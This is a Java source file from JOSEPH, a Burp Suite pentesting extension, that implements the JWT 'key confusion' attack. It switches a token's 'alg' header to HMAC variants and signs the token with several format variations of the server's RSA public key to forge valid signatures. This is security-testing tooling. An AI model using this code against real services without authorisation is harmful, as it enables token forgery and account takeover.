/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks;

import burp.*;

import eu.dety.burp.joseph.utilities.Decoder;
import eu.dety.burp.joseph.utilities.Jwk;
import eu.dety.burp.joseph.utilities.Logger;
import org.apache.commons.codec.binary.Base64;
import org.json.simple.parser.JSONParser;

import java.awt.*;
import java.security.PublicKey;
import java.util.*;
import java.util.List;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;


public class KeyConfusionInfo implements IAttackInfo {
    private static final Logger loggerInstance = Logger.getInstance();
    private static final ResourceBundle bundle = ResourceBundle.getBundle("JOSEPH");

    private Decoder joseDecoder;
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IParameter parameter;

    // Unique identifier for the attack class
    private static final String id = "key_confusion";
    // Full name of the attack
    private static final String name = "Key Confusion";
    // Attack description
    private static final String description = "Description";
    // List of types this attack is suitable for
    private static final List<String> suitableTypes = Arrays.asList("jwt", "jws");
    // Array of algorithms to test
    private static final String[] algorithms = {"HS256", "HS384", "HS512"};
    // List of public key variation to test
    private List<String> publicKeyVariations = new ArrayList<>();
    // Amount of requests needed
    private int amountRequests = 0;

    // List of prepared requests with payload info
    private HashMap<String, byte[]> requests = new HashMap<>();

    private JComboBox<String> publicKeySelection;
    private JTextArea publicKey;

    @Override
    public KeyConfusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
        this.joseDecoder = new Decoder();
        this.helpers = callbacks.getHelpers();
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        String publicKeyValue = publicKey.getText();

        // Throw error if public key value is empty
        if(publicKeyValue.isEmpty()) {
            throw new AttackPreparationFailedException(bundle.getString("PROVIDE_PUBKEY"));
        }

        // Parse public key according to selected format
        int publickKeyFormat = publicKeySelection.getSelectedIndex();

        switch (publickKeyFormat) {
            // JWK (JSON)
            case 1:
                loggerInstance.log(getClass(), "Key format is JWK:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                try {
                    Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);


                    loggerInstance.log(getClass(), "" + publickKeyValueJson, Logger.LogLevel.DEBUG);

                    List<PublicKey> publicKeys = new Jwk().getRsaPublicKeys(publickKeyValueJson);

                    for (PublicKey publicKey : publicKeys) {
                        loggerInstance.log(getClass(), "Encoded PubKey" + Base64.encodeBase64String(publicKey.getEncoded()), Logger.LogLevel.DEBUG);
                        publicKeyVariations.add(Base64.encodeBase64String(publicKey.getEncoded()));

                    }

                } catch (Exception e) {
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                }

                break;
            // PEM (String)
            default:
                loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                publicKeyVariations.add(publicKeyValue);

                String publickKeyValueNoHeaderFooter = publicKeyValue.replace("-----BEGIN PUBLIC KEY-----\n", "").replace("-----END PUBLIC KEY-----", "").replace("-----BEGIN RSA PUBLIC KEY-----\n", "").replace("-----END RSA PUBLIC KEY-----", "");
                publicKeyVariations.add(publickKeyValueNoHeaderFooter);

                String publickKeyValueNoLinebreaks = publicKeyValue.replaceAll("\\r\\n|\\r|\\n", "");
                publicKeyVariations.add(publickKeyValueNoLinebreaks);

                String publickKeyValueNoHeaderFooterNoLinebreaks = publickKeyValueNoHeaderFooter.replaceAll("\\r\\n|\\r|\\n", "");
                publicKeyVariations.add(publickKeyValueNoHeaderFooterNoLinebreaks);

                break;
        }


        for (String publicKey : publicKeyVariations) {
            for (String algorithm : algorithms) {
                try {
                    // Change the "alg" header value for each of the algorithms entries

                    byte[] request = this.requestResponse.getRequest();
                    String[] components = joseDecoder.getComponents(this.parameter.getValue());
                    String decodedHeader = joseDecoder.getDecoded(components[0]);
                    String decodedHeaderReplacedAlgorithm = decodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + algorithm + "\"");
                    String encodedHeaderReplacedAlgorithm = joseDecoder.getEncoded(decodedHeaderReplacedAlgorithm);

                    // Generate signature
                    // TODO: Different algs
                    Mac mac = Mac.getInstance("HmacSHA256");
                    SecretKeySpec secret_key = new SecretKeySpec(helpers.stringToBytes(publicKey), "HmacSHA256");
                    mac.init(secret_key);
                    loggerInstance.log(getClass(), publicKey, Logger.LogLevel.DEBUG);
                    String newSignature = joseDecoder.getEncoded(mac.doFinal(helpers.stringToBytes(joseDecoder.concatComponents(new String[] {encodedHeaderReplacedAlgorithm, components[1]}))));


                    String[] newComponents = {encodedHeaderReplacedAlgorithm, components[1], newSignature};
                    String newComponentsConcatenated = joseDecoder.concatComponents(newComponents);

                    IParameter updatedParameter = helpers.buildParameter(this.parameter.getName(), newComponentsConcatenated, this.parameter.getType());
                    request = helpers.updateParameter(request, updatedParameter);

                    requests.put(algorithm + publicKey.length(), request);
                    this.amountRequests++;
                } catch (Exception e) {
                    throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
                }
            }
        }

        return new KeyConfusion(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public String getDescription() {
        return description;
    }

    @Override
    public List<String> getSuitableTypes() {
        return suitableTypes;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean getExtraUI(JPanel extraPanel) {
        GridBagConstraints constraints = new GridBagConstraints();

        // Create combobox and textarea to add public key (in different formats)
        JLabel publicKeyLabel = new JLabel(bundle.getString("PUBKEY_FORMAT"));
        publicKeySelection = new JComboBox<>();
        DefaultComboBoxModel<String> publicKeySelectionListModel= new DefaultComboBoxModel<>();
        publicKey = new JTextArea(10, 35);

        publicKeySelectionListModel.addElement("PEM (String)");
        publicKeySelectionListModel.addElement("JWK (JSON)");

        publicKeySelection.setModel(publicKeySelectionListModel);

        constraints.fill = GridBagConstraints.HORIZONTAL;
        constraints.gridy = 0;
        extraPanel.add(publicKeyLabel, constraints);

        constraints.gridy = 1;
        extraPanel.add(publicKeySelection, constraints);

        constraints.gridy = 2;
        extraPanel.add(publicKey, constraints);

        return true;
    }


    @Override
    public boolean isSuitable(String type, String algorithm) {
        return true;
    }

    @Override
    public IHttpRequestResponse getRequestResponse() {
        return this.requestResponse;
    }

    @Override
    public HashMap<String, byte[]> getRequests() {
        return this.requests;
    }
}
